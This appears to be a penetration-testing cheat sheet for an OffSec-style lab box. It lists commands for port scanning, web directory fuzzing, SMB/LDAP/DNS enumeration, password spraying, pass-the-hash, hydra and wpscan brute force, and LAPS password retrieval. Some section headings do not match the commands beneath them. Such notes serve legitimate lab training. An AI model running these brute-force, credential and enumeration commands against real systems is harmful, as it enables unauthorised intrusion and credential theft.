---
Target IP: 192.168.212.60
Attacker IP: 192.168.45.176
---
#### nmap Command
```bash
ping -c 4 192.168.212.60
# Ping sweep scan
nmap -sn 192.168.212.60
# This will do the ping scan instead of ARP on port 80
nmap -sn -PS 192.168.212.60
# We can also specify the port or port range
nmap -sn -PS22 192.168.212.60
nmap -sn -PS1-1000 192.168.212.60

# Default port scan with version detection and default script findings
nmap -sCSV --min-rate=5000 -T4 192.168.212.60 -v -oN nmap-initial.log

## 1. All port scan | add -Pn if needed 
# -Pn: Skips host discovery; assumes the host is online.
nmap -p- --min-rate=5000 -T4 192.168.212.60 -v -oN nmap-all-ports.log
...
nmap -p$ports -sCSV 192.168.212.60 -v -oN nmap-services.log

# Best practice scan for UDP ports as well
sudo nmap -Pn -n 192.168.212.60 -sU --top-ports=100 --reason

sudo nmap -sU --top-ports 100 192.168.212.60

# SMB enum
sudo nmap -Pn -p139,445 -T4 --script "discovery and smb*" 192.168.212.60

# SNMP enum
sudo nmap -sU -p161 --script "*snmp*" 192.168.212.60
...
gobuster dir -u http://192.168.212.60 -w /usr/share/seclists/Discovery/Web-Content/common.txt -o gobuster-80.log -t 42 -b 400,404 --no-error

# Directory fuzzing dirlist - **raft medium** words/files
gobuster dir -u http://192.168.212.60 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -o gobuster-v2-80.log -t 42 -b 400,404 --no-error

# Directory fuzzing dirlist - big
gobuster dir -u http://192.168.212.60 -w /usr/share/seclists/Discovery/Web-Content/big.txt -o gobuster-80.log -t 42 -b 400,404 --no-error -x php,html,txt

# Directory fuzzing dirlist - dir 2.3 medium
gobuster dir -u http://192.168.212.60 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-80.log -t 42 -b 400,404 --no-error -x php,html,txt

# Directory fuzzing dirlist - dir 2.3 small
gobuster dir -u http://192.168.212.60 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -o gobuster-80.log -t 42 -b 400,404 --no-error -x php,html,txt

# Directory fuzzing dirlist - **raft small** words/files
gobuster dir -u http://192.168.212.60 -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt -o gobuster-v2-80.log -t 42 -b 400,404 --no-error

# Directory fuzzing dirlist - **raft large** words/files
gobuster dir -u http://192.168.212.60 -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -o gobuster-v2-80.log -t 42 -b 400,404 --no-error -x php,html,txt

# Exclude length
gobuster dir -u http://192.168.212.60 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt --exclude-length <LENGTH> -o gobuster-v2-80.log

# Subdomain fuzzing
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://192.168.212.60
```
...
curl -s http://192.168.212.60 | grep -i "api_key"
...
seq 1 100 | xargs -I {} -P 10 curl -X GET http://192.168.212.60
...
nmap --script=nfs-ls.nse,nfs-showmount.nse,nfs-statfs.nse -p 2049 192.168.212.60
```
#### DNS Enum
```bash
# DNS Zone transfer
dig @192.168.212.60 axfr <dns_name>

# dns enum
dnsenum 192.168.212.60
```
#### SMB Enum
```bash
nmap -script=smb-vuln\* -p445 192.168.212.60

enum4linux -a 192.168.212.60 
# Enumerate using login credentials:
enum4linux -u user_name -p password 192.168.212.60
# Enumerate user list:
enum4linux -U 192.168.212.60
  
smbclient -N -L //192.168.212.60//

smbclient -L 192.168.212.60 --option="client min protocol=core" -U ''

# Connect with a username:
smbclient //192.168.212.60/share -U username
# Connect with a workgroup:
smbclient //192.168.212.60/share --workgroup domain -U username
# Connect with a username and password:
smbclient //192.168.212.60/share -U username%password
  
crackmapexec smb 192.168.212.60 --shares
```
#### LinPEAS
```bash
# Output to file
...
# Null session
crackmapexec smb 192.168.212.60 -u "" up ""
# Connect to target using local account
crackmapexec smb 192.168.212.60 -u 'Administrator' -p 'PASSWORD' --local-auth
# Pass the hash against a subnet
crackmapexec smb 192.168.212.60 -u administrator -H 'LMHASH:NTHASH' --local-auth
crackmapexec smb 192.168.212.60 -u administrator -H 'NTHASH'
# Bruteforcing and Password Spraying
crackmapexec smb 192.168.212.60 -u "admin" -p "password1"
crackmapexec smb 192.168.212.60 -u "admin" -p "password1" "password2"
crackmapexec smb 192.168.212.60 -u "admin1" "admin2" -p "P@ssword"
crackmapexec smb 192.168.212.60 -u user_file.txt -p pass_file.txt
crackmapexec smb 192.168.212.60 -u user_file.txt -H ntlm_hashFile.txt
```
#### LDAP Enum
```bash
#If LDAP running some LDAP related `nmap` scripts to enumerate
nmap -n -sV --script "ldap* and not brute" 192.168.212.60

# we can run LDAP search with the naming context included to enumerate users and grep by SAM account name.
ldapsearch -x -H "ldap://192.168.212.60" -D '' -w '' -b "DC=hutch,DC=offsec" | grep sAMAccountName
...
ldapsearch -x -H "ldap://192.168.212.60" -D 'domain\username' -w 'password' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd 
...
```bash
# Top command 
dirsearch -u http://192.168.212.60 -e php,html -x 400,500 -r -t 8 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
...
dirsearch -u http://192.168.212.60 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 403  
# Use a custom wordlist for directory and file brute-forcing: 
dirsearch -u http://192.168.212.60 -w /path/to/wordlist.txt 
# Specify file extensions to look for during the scan: 
dirsearch -u http://192.168.212.60 -e php,txt,html 
# Recursively scan subdirectories for directories and files:
dirsearch -u http://192.168.212.60 -r
# Save scan results to a file: 
dirsearch -u http://192.168.212.60 -o dirseacrh.txt 
# Specify custom HTTP headers for the requests: 
dirsearch -u http://192.168.212.60 -H "User-Agent: Mozilla/5.0"
```
#### hydra
```bash
# Basic command
hydra -l <username> -P /usr/share/wordlists/rockyou.txt <protocol>://192.168.212.60 -t 4

# For FTP
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt <protocol>://192.168.212.60 -t 4

# -t :: Number of thread followed by the number

# base64 encoded credentials and response as 403 forbidden
hydra -L usernames.txt -P passwords.txt 192.168.212.60 -s 8081 http-post-form '/service/rapture/session:username=^USER64^&password=^PASS64^:Forbidden'

# Post web login forms
hydra -l <username> -P /usr/share/wordlists/rockyou.txt 192.168.212.60 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."

# Hydra basic authentication
hydra -l bob -P /usr/share/wordlists/rockyou.txt "http-get://192.168.212.60/protected:A=BASIC:F=401"
...
hydra -I -V -f -L usernames.txt -u -P /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt 192.168.212.60 ftp
```
#### Netcat with rlwrap
```bash
...
scp ./PsExec64.exe USER@192.168.212.60:C:/Users/ariah/Downloads/psexec.exe
...
scp test.txt user@192.168.212.60:/C:/Temp
...
smbmap -H 192.168.212.60

# For anonymous/guest access
smbmap -u 'guest' -p '' -H 192.168.212.60
...
smbmap -H 192.168.212.60 -u <username> -p <password>

# Scan with username and prompt for password
smbmap -H 192.168.212.60 -u <username>

# Scan with NTLM hash
smbmap -H 192.168.212.60 -u <username> -H <NTLM_hash>

# Scan with Kerberos ticket
smbmap -H 192.168.212.60 --kerberos
```
#### Crackmapexec
```bash
# SMB enumeration
crackmapexec smb 192.168.212.60 -u guest -p '' --shares

# To check the valid user and hashesh, we can use crackmapexec
crackmapexec winrm 192.168.212.60 -u <username file> -H <hash file>

```
#### Wpscan
```shell
# Enumerate WordPress version
wpscan --url http://192.168.212.60 --enumerate v
# Scan with API token
wpscan --url http://192.168.212.60 --api-token <your_api_token>
# HTTP basic authentication
wpscan --url http://192.168.212.60 --http-auth <username>:<password>
# Enumerate plugins, themes, and users

wpscan --url http://192.168.212.60 --enumerate ap,t,u --plugins-detection aggressive
...
wpscan --url http://192.168.212.60 --enumerate u --passwords <password_list>
# Brute force passwords for a specific user
wpscan --url http://192.168.212.60 -U <username> -P <password_list>
# Scan with a proxy
wpscan --url http://192.168.212.60 --proxy <proxy_ip:port>
# Scan for known vulnerabilities
wpscan --url http://192.168.212.60 --enumerate vp
# Enumerate plugins with vulnerability checks
wpscan --url http://192.168.212.60 --api-token YOUR_API_TOKEN --enumerate vp
# Brute force usernames
wpscan --url http://192.168.212.60 --enumerate u --passwords /path/to/passwords.txt
# Brute force password for a specific user
wpscan --url http://192.168.212.60 -U admin -P /path/to/passwords.txt
# Scan using an HTTP proxy
wpscan --url http://192.168.212.60 --proxy 127.0.0.1:8080
```
